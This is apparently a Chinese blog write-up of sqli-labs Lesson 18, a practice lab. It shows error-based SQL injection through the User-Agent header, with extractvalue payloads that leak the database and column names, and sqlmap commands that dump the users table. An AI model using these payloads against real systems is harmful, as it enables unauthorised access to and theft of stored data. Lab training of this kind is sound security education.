---
title: sqli-labs lession 18 POST基于错误的Uagent字段数据头注入
date: 2018-09-28 19:30:37
tags:
categories: sql注入
---
# sqli-labs lession 18 POST基于错误的Uagent字段数据头注入 #
---

## 登录界面 ##

![1](/img/sql/Lesson-18/1.png)

## 分析 ##

显示了咱的ip地址...嗯...测试了下Username和Password的输入数据,发现没有什么搞头。用个admin账号登录成功试了下。

![2](/img/sql/Lesson-18/2.png)

把我的User-Agent信息显示了出来。

User-Agent干什么用呢:

![3](/img/sql/Lesson-18/3.png)

`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0`

对照一下手册查看信息

Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion

* Mozilla/5.0 是一个通用标记符号，用来表示与 Mozilla 兼容，这几乎是现代浏览器的标配。
    
* platform 用来说明浏览器所运行的原生系统平台（例如 Windows、Mac、Linux 或 Android），以及是否运行在手机上。搭载 Firefox OS 的手机仅简单地使用了 "Mobile" 这个字符串；因为 web 本身就是平台。注意 platform 可能会包含多个使用 "; " 隔开的标记符号。
    
* rv:geckoversion 表示 Gecko 的发布版本号（例如  "17.0"）。在近期发布的版本中，geckoversion 表示的值与 firefoxversion 相同。
    
* Gecko/geckotrail 表示该浏览器基于 Gecko 渲染引擎。

* 在桌面浏览器中， geckotrail  是固定的字符串 "20100101" 。
    
* Firefox/firefoxversion 表示该浏览器是 Firefox，并且提供了版本号信息（例如  "17.0"）。

拿到了我的信息总要有点东西留给我的吧。

查看源码：

![4](/img/sql/Lesson-18/4.png)

对账户密码做了过滤,登录成功后接着又把ip地址和User-Agent信息保存下了数据库的`uagents`表中。

![5](/img/sql/Lesson-18/5.png)

因为插入User-Agent信息插入数据表的时候没有检查,可以在此处利用报错注入。

## 注入 ##

先用正确账号登录。

![6](/img/sql/Lesson-18/6.png)

再在`User-Agent`构造报错。

`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1`

检查出单引号闭合。

![7](/img/sql/Lesson-18/7.png)

payload:

`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`

![8](/img/sql/Lesson-18/8.png)

中间与Lesson-17一样,直接上获取列的图

![9](/img/sql/Lesson-18/9.png)

`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e)) and '1'='1`

## SQLMAP ##

<font color=red>
--leveal 

level: 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量

--user-agent

指定User-Agent

--data

指定请求的内容

--threads

指定并发线程

--dbms

指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.

--fresh-queries 

fresh-queries会忽略之前的查询结果,进行重新请求操作

--flush-session

flush-session会清空当前URL相关的session

</font>

`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data "uname=admin&passwd=admin&submit=Submit" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1" --level 4 --threads 10 --dbms mysql --fresh-queries --flush-session`

![10](/img/sql/Lesson-18/10.png)

`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data "uname=admin&passwd=admin&submit=Submit" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1" -D security -T users --columns --dump`

![11](/img/sql/Lesson-18/11.png)